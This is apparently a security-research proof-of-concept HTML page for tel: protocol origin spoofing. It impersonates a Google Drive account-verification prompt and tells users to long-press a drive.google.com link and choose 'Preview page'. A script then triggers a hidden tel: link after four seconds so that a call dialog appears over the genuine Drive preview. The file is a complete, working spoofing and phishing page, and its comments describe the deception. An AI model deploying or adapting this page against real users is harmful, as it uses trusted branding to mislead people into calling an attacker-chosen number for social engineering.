<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Security Research - Tel: Protocol Spoofing via Preview Page</title>
    <style>
      body {
        font-family:
          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial,
          sans-serif;
        text-align: center;
        background: #f8f9fa;
        padding: 20px;
      }
      .container {
        max-width: 500px;
        margin: 50px auto;
        background: white;
        padding: 40px;
        border-radius: 12px;
        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
      }
      .logo {
        width: 60px;
        margin-bottom: 20px;
      }
      h2 {
        color: #202124;
        font-size: 22px;
      }
      p {
        color: #5f6368;
        line-height: 1.6;
      }

      #trigger-link {
        display: block;
        width: 100%;
        margin: 30px 0;
        padding: 16px;
        background: #1a73e8;
        color: white;
        text-decoration: none;
        border-radius: 8px;
        font-weight: bold;
        font-size: 16px;
        transition: background 0.2s;
      }

      #status-box {
        margin-top: 20px;
        padding: 15px;
        border-radius: 8px;
        font-size: 14px;
      }
      .waiting {
        background: #e8f0fe;
        color: #1967d2;
      }
      .success {
        background: #e6f4ea;
        color: #137333;
        border: 1px solid #137333;
      }

      #preview-area {
        display: none;
        margin-top: 20px;
        text-align: left;
        border-top: 1px solid #eee;
        padding-top: 20px;
      }
      pre {
        background: #f1f3f4;
        padding: 10px;
        border-radius: 4px;
        overflow-x: auto;
        font-size: 12px;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <img
        src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg"
        class="logo"
        alt="Drive"
      />
      <h2>Verify Your Account</h2>
      <p>
        To continue, please verify your phone number via Google Drive security
        check.
      </p>

      <a id="trigger-link" href="https://drive.google.com/">
        Hold here & select "Preview page"
      </a>

      <div id="status-box" class="waiting">
        Status: Waiting for interaction...
      </div>

      <!-- Elemen tersembunyi untuk memicu tel: protokol -->
      <a id="telTrigger" href="tel:+6281234567890" style="display: none"
        >Call now</a
      >

      <div id="preview-area">
        <strong style="color: #d93025">Attack Result:</strong>
        <pre id="output">
No action yet. If dialog appeared over Google Drive preview, origin spoofing succeeded.</pre
        >
      </div>
    </div>

    <script>
      const triggerLink = document.getElementById("trigger-link");
      const telTrigger = document.getElementById("telTrigger");
      const statusBox = document.getElementById("status-box");
      const previewArea = document.getElementById("preview-area");
      const output = document.getElementById("output");

      // Mencegah navigasi default dari link utama (agar tidak langsung buka drive.google.com)
      triggerLink.addEventListener("click", (e) => {
        e.preventDefault();
      });

      // Event contextmenu (long-press / tekan lama) untuk memulai race condition
      triggerLink.addEventListener("contextmenu", function (e) {
        // Kita tetap perlu membiarkan menu konteks browser muncul agar user bisa memilih "Preview page"
        // Tidak mencegah default agar menu konteks tetap muncul.
        statusBox.innerText =
          "Long-press detected. Please select 'Preview page' from menu...";

        // Timer 4 detik untuk memicu dialog panggilan telepon setelah preview terbuka
        setTimeout(function () {
          // Memicu dialog protokol eksternal (tel:)
          // Dengan mengklik elemen tersembunyi atau langsung mengubah location
          // Gunakan .click() pada anchor dengan href="tel:..." untuk memunculkan dialog konfirmasi
          telTrigger.click();

          statusBox.className = "success";
          statusBox.innerText =
            "Payload triggered! Tel: dialog should appear over preview.";
          previewArea.style.display = "block";
          output.innerText =
            "Spoofing attempt executed. If a 'Call' dialog appeared on top of drive.google.com preview, origin spoofing is successful.\n\n" +
            "User may believe Google Drive requested a phone call, leading to potential social engineering.";
        }, 4000);
      });

      // Opsional: tangkap jika tel: berhasil dipanggil (tidak bisa ditangkap langsung, hanya untuk logging)
      telTrigger.addEventListener("click", (e) => {
        console.log("Tel trigger clicked. Dialog should appear.");
      });
    </script>
  </body>
</html>
